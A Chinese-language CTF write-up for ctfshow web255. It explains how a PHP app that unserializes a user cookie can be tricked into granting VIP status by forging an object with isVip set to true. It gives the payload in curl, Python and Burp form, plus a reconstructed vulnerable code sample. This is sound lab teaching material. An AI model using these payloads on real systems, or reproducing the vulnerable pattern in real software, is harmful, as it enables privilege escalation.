## 一句话概括

题目把「登录用户」对象塞进 **cookie** 再 `unserialize()`，对象里有个决定身份的布尔属性 `isVip`（默认 `false`）。既然反序列化会**按 payload 覆盖属性**，那把 `isVip` 写成 `b:1`（true）就行 —— 一句话拿到 VIP 身份。

## 本题情景与解题手法

> 原笔记 `web255.md` **只保留了提交用的 payload（curl / python / Burp 三种写法），没有保存题目源码**。下面的「题目形态」是按 payload 反推的结构示意，不是原文；关键结论（改 `isVip`）可靠，具体类名/属性名以实际题目为准。

### 题目形态（示意）

```php
<?php
class ctfShowUser {
    public $username = 'xxxxxx';
    public $password = 'xxxxxx';
    public $isVip    = false;      // ★ 目标属性：默认不是 VIP

    public function checkVip() {
        return $this->isVip;
    }
}

// 登录入口：从 cookie 里取出序列化对象
$u = unserialize($_COOKIE['user']);
if ($u->checkVip()) {
    // 是 VIP → 显示 / 拿到 flag
}
?>
```

### 第一步：找出口与入口

- **入口**：`unserialize($_COOKIE['user'])` —— cookie 完全可控；
- **出口**：`checkVip()` 返回 `isVip`，为真时给 flag。

### 第二步：认清「要改哪个属性」

`isVip` 是 **`public`** 属性，默认 `false`。序列化格式里：

| 类型 | 写法 |
|---|---|
| 布尔真 | `b:1;` |
| 布尔假 | `b:0;` |

`isVip = true` 就写成 `s:5:"isVip";b:1;`。

### 第三步：构造 payload

类名 `ctfShowUser` 长度 = **11**，对象里放 **1** 个属性：

```text
O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}
```

逐项核对：

| 字段 | 值 | 字节数 | 核对 |
|---|---|---|---|
| 类名 | `ctfShowUser` | 11 | `O:11:` ✓ |
| 属性个数 | —— | 1 | `:1:` ✓ |
| 属性名 | `isVip` | 5 | `s:5:` ✓ |
| 属性值 | `true` | —— | `b:1;` ✓ |

### 第四步：放进 cookie 提交

payload 里有 `"` `;` `{` `}` 这些 **URL 特殊字符**，浏览器 cookie 里直接放容易被截断，所以要 **URL 编码**（`O%3A11%3A%22ctfShowUser%22...`）。三种提交方式效果一样：

```bash
# ① curl（用单引号，省去手工编码）
curl -b 'user=O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}' \
     'http://靶机地址/?username=test&password=test'
```

```python
# ② requests
import requests
cookies = {'user': 'O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}'}
r = requests.get('http://靶机地址/', params={'username':'test','password':'test'}, cookies=cookies)
print(r.text)
```

```http
# ③ Burp：直接改请求里的 Cookie 行
GET /?username=test&password=test HTTP/1.1
Host: 靶机地址
Cookie: user=O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}
```

> 成功后 `checkVip()` 返回 `true`，直接进入 VIP 分支拿到 flag。

### 注入手法一句话总结

> **`isVip` 由反序列化数据覆盖** → 把 default 的 `false` 换成 `b:1` → `O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}` → URL 编码后作为 `user` cookie 提交 → `checkVip()` 为真 → 拿 flag。

## 利用条件

1. **有可控的 `unserialize()` 且参数来自 cookie / GET / POST**；
2. **身份判断依赖对象里的某个属性**（题中是 `isVip`），而不是服务端（session / 数据库）里的状态；
3. **知道目标类名与属性名**（`ctfShowUser` / `isVip`），且属性是 `public`（`private` / `protected` 要加 `\0` 前缀，见 01 篇）；
4. **cookie 里的特殊字符要 URL 编码**，否则可能被截断。

## Payload 速查

| 目的 | 写法 |
|---|---|
| 把 `isVip` 改成真 | `O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}` |
| 布尔真 / 假 | `b:1;` / `b:0;` |
| 放进 cookie | `Cookie: user=O:11:"ctfShowUser":1:{s:5:"isVip";b:1;}` |
| 生成（推荐） | `echo urlencode(serialize(new ctfShowUser()));` 改好属性再提交 |

## 踩坑与备注

- **原笔记只有 payload、没有源码**：本文的「题目形态」是结构示意，主要为讲清「改属性覆盖默认值」这条最简反序列化链；同系列的 **11 篇（web257）/ 12 篇（web258）** 保留了源码，可对照看 `ctfShowUser` 的完整结构。
- **改布尔属性是最简单的一类**：不需要 POP 链、不需要魔术方法，只要「属性进判断」这一条通路。见到「VIP / admin / isLogin 这类 flag 存在对象属性里」先试这一招。
- **cookie 的编码层次要对**：本题 payload 直接放 cookie（URL 编码即可）；有的题外层还套了 `base64_encode`（如 06 篇 web262），那就要先 base64 再提交，别混。
- **`O:11:` 必须准确**：`ctfShowUser` 是 11 个字符（`c t f S h o w U s e r`）；数错一位整串解析失败。
- **原笔记里的靶机域名已抽象**：文中统一写作 `靶机地址`，不再出现任何真实域名 / 路径。
